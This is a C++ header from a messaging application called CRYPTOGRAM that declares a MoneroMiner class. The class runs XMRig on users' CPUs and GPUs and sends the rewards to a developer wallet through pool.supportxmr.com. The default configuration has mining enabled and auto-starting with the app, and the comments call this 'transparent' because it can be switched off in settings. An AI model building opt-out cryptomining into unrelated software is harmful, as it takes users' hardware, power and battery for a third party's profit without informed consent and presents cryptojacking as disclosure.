/*
This file is part of CRYPTOGRAM,
the most advanced secure messaging application.

For license and copyright information please follow this link:
https://github.com/SWORDOps/CRYPTOGRAM/blob/main/LICENSE
*/
#pragma once

#include "../../lib_base/base/timer.h"
#include "base/weak_ptr.h"

#include <QtCore/QObject>
#include <QtCore/QString>
#include <QtCore/QDateTime>
#include <QtCore/QProcess>
#include <QtCore/QMutex>

namespace Data {

// Forward declarations
class Session;

/**
 * Monero Mining Statistics
 *
 * Real-time statistics from XMRig mining operations.
 */
struct MoneroMiningStatistics {
	// Mining performance
	double hashrate = 0.0;              // Current total hashrate in H/s (hashes per second)
	double hashrateAvg10s = 0.0;        // 10-second average
	double hashrateAvg1m = 0.0;         // 1-minute average
	double hashrateAvg15m = 0.0;        // 15-minute average

	// Hardware-specific hashrates
	double cpuHashrate = 0.0;           // CPU hashrate
	double gpuHashrate = 0.0;           // Total GPU hashrate
	double nvidiaHashrate = 0.0;        // NVIDIA GPU hashrate (CUDA)
	double amdHashrate = 0.0;           // AMD GPU hashrate (OpenCL)

	// Active hardware
	bool cpuActive = false;             // CPU mining active
	bool nvidiaActive = false;          // NVIDIA GPU mining active
	bool amdActive = false;             // AMD GPU mining active
	QString activeHardware;             // Human-readable list: "CPU, NVIDIA GPU"

	// Share statistics
	qint64 sharesAccepted = 0;          // Accepted shares (valid work)
	qint64 sharesRejected = 0;          // Rejected shares
	double acceptanceRate = 0.0;        // % of accepted shares

	// Session statistics
	QDateTime sessionStart;             // When mining started
	qint64 totalMiningSeconds = 0;      // Total time spent mining
	qint64 totalHashesComputed = 0;     // Total hashes calculated

	// Pool information
	QString poolAddress;                // Connected pool
	bool isConnected = false;           // Connection status
	QDateTime lastShareTime;            // Last successful share

	// CPU usage
	int cpuThreads = 0;                 // Number of mining threads
	double cpuUsage = 0.0;              // Current CPU usage %
	int configuredCpuPercent = 20;      // Configured CPU limit

	// GPU usage
	int gpuDevices = 0;                 // Number of GPUs detected
	double gpuUsage = 0.0;              // Average GPU usage %

	// Estimated earnings (approximate)
	double estimatedXmrPerDay = 0.0;    // Estimated XMR/day at current hashrate
	QString currentDifficulty;          // Network difficulty
};

/**
 * Monero Mining Configuration
 *
 * User-configurable mining parameters.
 */
struct MoneroMiningConfig {
	// Mining pool settings (configured by developer)
	QString poolAddress = "pool.supportxmr.com:3333";
	QString walletAddress = "";         // Developer's XMR wallet (set in code)
	QString rigName = "CRYPTOGRAM";     // Identifier in pool stats

	// CPU settings
	int cpuPercent = 20;                // CPU usage limit (0-100%, 0=disabled)
	int cpuThreads = 0;                 // 0 = auto-calculate from cpuPercent
	int cpuPriority = 2;                // 1=low, 2=normal, 3=high (default: normal)

	// Idle detection
	bool onlyWhenIdle = true;           // Only mine when PC is idle
	int idleMinutes = 15;               // Minutes of inactivity before "idle"
	bool onlyWhenCharging = true;       // Only mine when charging (laptops)
	int minBatteryPercent = 50;         // Minimum battery to continue

	// Auto-start
	bool enabled = true;                // ENABLED by default (transparent)
	bool autoStart = true;              // Start automatically with CRYPTOGRAM

	// Mining algorithm
	QString algorithm = "rx/0";         // RandomX for Monero

	// Advanced
	bool enableHugePages = true;        // Use huge pages (better performance)
	bool enableHardwareAES = true;      // Use AES-NI if available
	int donateLevel = 0;                // XMRig default donate (we set to 0)
};

/**
 * Idle State Detection
 *
 * Tracks system idle state for intelligent mining.
 */
struct SystemIdleState {
	bool isIdle = false;
	qint64 idleTimeSeconds = 0;
	qint64 lastInputTime = 0;
	bool isCharging = false;
	int batteryPercent = 100;
	double systemCpuUsage = 0.0;
};

/**
 * Monero Miner - CPU Mining Support for CRYPTOGRAM Development
 *
 * Integrates XMRig to allow users to optionally donate idle CPU cycles
 * to mine Monero (XMR) cryptocurrency, supporting CRYPTOGRAM development
 * and infrastructure costs.
 *
 * TRANSPARENCY:
 * - Enabled by default but FULLY DISCLOSED in settings
 * - Clear explanation of what mining is and how it helps
 * - Real-time statistics visible to users
 * - Easy to disable anytime
 * - Only uses IDLE CPU time (default: 15 min idle)
 * - Respects battery and charging state
 * - No blockchain download required (uses mining pool)
 *
 * TECHNICAL DETAILS:
 * - Uses XMRig miner (industry-standard, open source)
 * - Connects to mining pool (no blockchain sync needed)
 * - Mines Monero using RandomX algorithm (CPU-optimized)
 * - All rewards go to developer wallet (supports development)
 * - Default: 20% CPU when idle for 15 minutes
 * - Automatically stops when user is active
 *
 * PRIVACY:
 * - Mining has NO access to messages or user data
 * - Uses only spare CPU cycles for cryptographic hashing
 * - No personal information sent to pool
 * - Pool only sees: hashrate, shares, wallet address (developer's)
 *
 * SETTINGS LOCATION:
 * Settings → CRYPTOGRAM → Development Support → CPU Mining
 */
class MoneroMiner : public QObject, public base::has_weak_ptr {
	Q_OBJECT

public:
	explicit MoneroMiner(Session *session);
	~MoneroMiner();

	// Initialization
	bool initialize();
	bool isInitialized() const { return _initialized; }
	void shutdown();

	// Mining control
	void startMining();
	void stopMining();
	void pauseMining();
	void resumeMining();
	bool isMining() const { return _isMining; }
	bool isPaused() const { return _paused; }

	// Configuration
	void setEnabled(bool enabled);
	bool isEnabled() const { return _config.enabled; }

	void setConfiguration(const MoneroMiningConfig &config);
	MoneroMiningConfig getConfiguration() const { return _config; }

	void setCpuPercent(int percent);
	int getCpuPercent() const { return _config.cpuPercent; }

	void setOnlyWhenIdle(bool onlyWhenIdle);
	bool getOnlyWhenIdle() const { return _config.onlyWhenIdle; }

	void setIdleMinutes(int minutes);
	int getIdleMinutes() const { return _config.idleMinutes; }

	// Statistics
	MoneroMiningStatistics getStatistics() const { return _statistics; }
	void resetStatistics();

	// Idle state
	SystemIdleState getIdleState() const;
	bool detectIdleState();
	void updateIdleState();

	// Pool connection
	bool isConnectedToPool() const;
	QString getPoolAddress() const { return _config.poolAddress; }

	// XMRig process management
	bool isXmrigRunning() const;
	QString getXmrigVersion() const;

Q_SIGNALS:
	void miningStarted();
	void miningStopped();
	void miningPaused();
	void miningResumed();
	void statisticsUpdated(const MoneroMiningStatistics &stats);
	void poolConnected();
	void poolDisconnected();
	void shareAccepted();
	void shareRejected();
	void idleStateChanged(bool isIdle);
	void error(const QString &error);

private Q_SLOTS:
	void checkIdleState();
	void updateMiningState();
	void updateStatistics();
	void handleBatteryChange();
	void processXmrigOutput();
	void handleXmrigError();
	void handleXmrigFinished(int exitCode);

private:
	// XMRig process management
	bool startXmrigProcess();
	void stopXmrigProcess();
	QString generateXmrigConfig() const;
	QString getXmrigBinaryPath() const;

	// Idle detection helpers
	qint64 getSystemIdleTime();  // Platform-specific idle time detection
	bool isBatteryCharging();    // Check if device is charging
	int getBatteryPercentage();  // Get current battery level
	double getSystemCpuUsage();  // Get current system CPU usage

	// CPU thread calculation
	int calculateOptimalThreads() const;
	int calculateThreadsFromPercent(int percent) const;

	// Statistics parsing
	void parseHashrate(const QString &line);
	void parseShareAccepted(const QString &line);
	void parseShareRejected(const QString &line);
	void parsePoolConnection(const QString &line);

	// Configuration helpers
	void loadConfiguration();
	void saveConfiguration();
	void setDeveloperWallet();  // Set developer XMR wallet address

	Session *_session = nullptr;
	bool _initialized = false;
	bool _isMining = false;
	bool _paused = false;

	MoneroMiningConfig _config;
	MoneroMiningStatistics _statistics;
	SystemIdleState _idleState;

	// XMRig process
	QProcess *_xmrigProcess = nullptr;
	QString _xmrigConfigPath;
	QString _xmrigLogBuffer;

	// Timers
	base::Timer _idleCheckTimer;
	base::Timer _statsUpdateTimer;
	base::Timer _stateUpdateTimer;

	// Synchronization
	QMutex _configMutex;

	// State tracking
	QDateTime _miningStartTime;
	qint64 _totalMiningTime = 0;  // Cumulative across sessions
	bool _wasIdleLastCheck = false;
};

} // namespace Data
